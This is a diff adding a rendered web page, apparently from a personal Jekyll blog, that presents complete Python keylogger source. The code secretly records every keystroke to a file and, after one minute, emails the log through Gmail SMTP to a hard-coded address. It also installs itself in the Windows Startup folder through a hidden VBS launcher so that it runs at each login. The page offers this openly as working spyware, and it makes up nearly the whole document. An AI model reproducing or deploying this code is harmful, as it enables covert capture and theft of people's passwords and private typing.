@@ -1,0 +1,116 @@
+I"•9
+<p>OBJECTIVE:</p>
+<blockquote>
+  <p>Create a Keylogger with password encryption for one minute execution.</p>
+</blockquote>
+
+<p>CREATED BY: SEAN DAZA
+<code class="language-plaintext highlighter-rouge">https://github.com/seandaza</code></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># -*- coding: utf-8 -*-
+</span>
+<span class="kn">import</span> <span class="nn">datetime</span>
+<span class="kn">from</span> <span class="nn">pynput.keyboard</span> <span class="kn">import</span> <span class="n">Listener</span>
+
+<span class="kn">import</span> <span class="nn">time</span>
+
+<span class="kn">from</span> <span class="nn">cryptography.fernet</span> <span class="kn">import</span> <span class="n">Fernet</span>
+
+<span class="kn">from</span> <span class="nn">email.mime.multipart</span> <span class="kn">import</span> <span class="n">MIMEMultipart</span>
+<span class="kn">from</span> <span class="nn">email.mime.text</span> <span class="kn">import</span> <span class="n">MIMEText</span>
+<span class="kn">from</span> <span class="nn">email.mime.base</span> <span class="kn">import</span> <span class="n">MIMEBase</span>
+<span class="kn">import</span> <span class="nn">smtplib</span>
+
+<span class="kn">import</span> <span class="nn">getpass</span><span class="p">,</span> <span class="n">os</span>
+
+<span class="k">def</span> <span class="nf">key_listener</span><span class="p">():</span>
+
+    <span class="n">d</span> <span class="o">=</span> <span class="n">datetime</span><span class="p">.</span><span class="n">datetime</span><span class="p">.</span><span class="n">now</span><span class="p">().</span><span class="n">strftime</span><span class="p">(</span><span class="s">"%Y-%m-%d_%H-%M-%S"</span><span class="p">)</span>
+
+    <span class="n">file_name</span> <span class="o">=</span> <span class="s">'keylogger_{}.txt'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">d</span><span class="p">)</span>
+
+    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_name</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span>
+
+    <span class="n">t0</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="n">time</span><span class="p">()</span>
+
+    <span class="k">def</span> <span class="nf">key_recorder</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
+        <span class="n">key</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">key</span> <span class="o">==</span> <span class="s">'Key.enter'</span><span class="p">:</span>
+            <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+        <span class="k">elif</span> <span class="n">key</span> <span class="o">==</span> <span class="s">'Key.space'</span><span class="p">:</span>
+            <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">key</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'Key.space'</span><span class="p">,</span> <span class="s">' '</span><span class="p">))</span>
+        <span class="k">elif</span> <span class="n">key</span> <span class="o">==</span> <span class="s">'Key.backspace'</span><span class="p">:</span>
+            <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">key</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"Key.backspace"</span><span class="p">,</span> <span class="s">"%BORRAR%"</span><span class="p">))</span>
+        <span class="k">elif</span> <span class="n">key</span> <span class="o">==</span> <span class="s">'&lt;65027&gt;'</span><span class="p">:</span>
+            <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">'%ARROBA%'</span><span class="p">)</span>
+        <span class="c1"># elif key == "'\\x03'":
+</span>        <span class="c1">#     f.write('\n\nSaliendo del keylogger . . .')
+</span>        <span class="c1">#     f.close()
+</span>        <span class="c1">#     quit()
+</span>        <span class="k">else</span><span class="p">:</span>
+            <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">key</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"'"</span><span class="p">,</span> <span class="s">""</span><span class="p">))</span>
+
+        <span class="k">if</span> <span class="n">time</span><span class="p">.</span><span class="n">time</span><span class="p">()</span><span class="o">-</span><span class="n">t0</span> <span class="o">&gt;</span> <span class="mi">60</span><span class="p">:</span>
+            <span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+            <span class="n">enviar_email</span><span class="p">(</span><span class="n">file_name</span><span class="p">)</span>
+            <span class="n">quit</span><span class="p">()</span>
+
+    <span class="k">with</span> <span class="n">Listener</span><span class="p">(</span><span class="n">on_press</span><span class="o">=</span><span class="n">key_recorder</span><span class="p">)</span> <span class="k">as</span> <span class="n">listener</span><span class="p">:</span>
+        <span class="n">listener</span><span class="p">.</span><span class="n">join</span><span class="p">()</span>
+
+
+<span class="k">def</span> <span class="nf">enviar_email</span><span class="p">(</span><span class="n">nombre</span><span class="p">):</span>
+
+    <span class="k">def</span> <span class="nf">cargar_key</span><span class="p">():</span>
+        <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="s">'pass.key'</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
+
+    <span class="n">key</span> <span class="o">=</span> <span class="n">cargar_key</span><span class="p">()</span>
+
+    <span class="n">clave</span> <span class="o">=</span> <span class="n">Fernet</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+    <span class="n">pass_enc</span> <span class="o">=</span> <span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s">'pass.enc'</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">).</span><span class="n">read</span><span class="p">())</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="n">clave</span><span class="p">.</span><span class="n">decrypt</span><span class="p">((</span><span class="n">pass_enc</span><span class="p">)).</span><span class="n">decode</span><span class="p">()</span>
+
+    <span class="n">msg</span> <span class="o">=</span> <span class="n">MIMEMultipart</span><span class="p">()</span>
+    <span class="n">mensaje</span> <span class="o">=</span> <span class="s">'Guarda bien esto!'</span>
+
+    <span class="n">msg</span><span class="p">[</span><span class="s">'From'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'seandaza@gmail.com'</span>
+    <span class="n">msg</span><span class="p">[</span><span class="s">'To'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'seandaza@gmail.com'</span>
+    <span class="n">msg</span><span class="p">[</span><span class="s">'Subject'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'Te lo he Capturado'</span>
+
+    <span class="n">msg</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">MIMEText</span><span class="p">(</span><span class="n">mensaje</span><span class="p">,</span> <span class="s">'plain'</span><span class="p">))</span>
+
+    <span class="n">attachment</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">nombre</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span>
+
+    <span class="n">p</span> <span class="o">=</span> <span class="n">MIMEBase</span><span class="p">(</span><span class="s">'application'</span><span class="p">,</span> <span class="s">'octet-stream'</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">set_payload</span><span class="p">((</span><span class="n">attachment</span><span class="p">).</span><span class="n">read</span><span class="p">())</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">add_header</span><span class="p">(</span><span class="s">'Content-Disposition'</span><span class="p">,</span><span class="s">"attachment; filename= %s"</span> <span class="o">%</span> <span class="nb">str</span><span class="p">(</span><span class="n">nombre</span><span class="p">))</span>
+    <span class="n">msg</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+
+    <span class="n">server</span> <span class="o">=</span> <span class="n">smtplib</span><span class="p">.</span><span class="n">SMTP</span><span class="p">(</span><span class="s">'smtp.gmail.com: 587'</span><span class="p">)</span>
+    <span class="n">server</span><span class="p">.</span><span class="n">starttls</span><span class="p">()</span>
+    <span class="n">server</span><span class="p">.</span><span class="n">login</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="s">'From'</span><span class="p">],</span> <span class="n">password</span><span class="p">)</span>
+    <span class="n">server</span><span class="p">.</span><span class="n">sendmail</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="s">'From'</span><span class="p">],</span> <span class="n">msg</span><span class="p">[</span><span class="s">'To'</span><span class="p">],</span> <span class="n">msg</span><span class="p">.</span><span class="n">as_string</span><span class="p">())</span>
+    <span class="n">server</span><span class="p">.</span><span class="n">quit</span><span class="p">()</span>
+
+
+<span class="k">def</span> <span class="nf">mover_fichero</span><span class="p">():</span>
+    <span class="n">USER_NAME</span> <span class="o">=</span> <span class="n">getpass</span><span class="p">.</span><span class="n">getuser</span><span class="p">()</span>
+    <span class="n">final_path</span> <span class="o">=</span> <span class="s">'C:</span><span class="se">\\</span><span class="s">Users</span><span class="se">\\</span><span class="s">{}</span><span class="se">\\</span><span class="s">AppData</span><span class="se">\\</span><span class="s">Roaming</span><span class="se">\\</span><span class="s">Microsoft</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">Start Menu</span><span class="se">\\</span><span class="s">Programs</span><span class="se">\\</span><span class="s">Startup'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">USER_NAME</span><span class="p">)</span>
+    <span class="n">path_script</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">abspath</span><span class="p">(</span><span class="n">__file__</span><span class="p">))</span>
+
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'open.bat'</span><span class="p">,</span> <span class="s">'w+'</span><span class="p">)</span> <span class="k">as</span> <span class="n">bat_file</span><span class="p">:</span>
+        <span class="n">bat_file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">'cd "{}"</span><span class="se">\n</span><span class="s">'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">path_script</span><span class="p">))</span>
+        <span class="n">bat_file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">'python "keylogger.py"'</span><span class="p">)</span>
+
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">final_path</span><span class="o">+</span><span class="s">'</span><span class="se">\\</span><span class="s">'</span><span class="o">+</span><span class="s">"open.vbs"</span><span class="p">,</span> <span class="s">"w+"</span><span class="p">)</span> <span class="k">as</span> <span class="n">vbs_file</span><span class="p">:</span>
+        <span class="n">vbs_file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">'Dim WinScriptHost</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+        <span class="n">vbs_file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">'Set WinScriptHost = CreateObject("WScript.Shell")</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+        <span class="n">vbs_file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">'WinScriptHost.Run Chr(34) &amp; "{}\open.bat" &amp; Chr(34), 0</span><span class="se">\n</span><span class="s">'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">path_script</span><span class="p">))</span>
+        <span class="n">vbs_file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">'Set WinScripthost = Nothing</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="n">mover_fichero</span><span class="p">()</span>
+    <span class="n">key_listener</span><span class="p">()</span>	
+</code></pre></div></div>
+
+:ET
